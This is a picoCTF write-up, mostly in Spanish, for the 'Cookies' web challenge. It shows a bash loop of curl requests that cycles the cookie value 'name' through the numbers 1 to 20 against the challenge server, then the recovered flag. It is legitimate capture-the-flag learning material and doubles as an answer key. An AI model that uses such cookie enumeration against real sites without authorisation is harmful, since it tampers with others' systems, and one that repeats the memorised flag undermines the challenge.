# Cookies

## Description

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)
## Hints 

* (None)

## Solución

En la terminal de webshell, ingresamos un **for** especificando que busque la cookie en la que se esconde la flag en un numero del 1 al 20,  enseguida ingresamos el link modificado con un **"check"** al final del url, después en la cookie ponemos una función en la que busca en cada cookie y al final nos muestra en cual estaba escondida para esterilizar mas la salida de la flag se agrego un **"grep -oE "picoCTF{.*?"}"** para que se visualice mejor el resultado de la flag.

```
Jaz_sparrow-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>
            
Jaz_sparrow-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?"}
picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
Jaz_sparrow-picoctf@webshell:~$ 
```

### Respuesta: picoCTF{3v3ry1_l0v3s_c00k135_88acab36}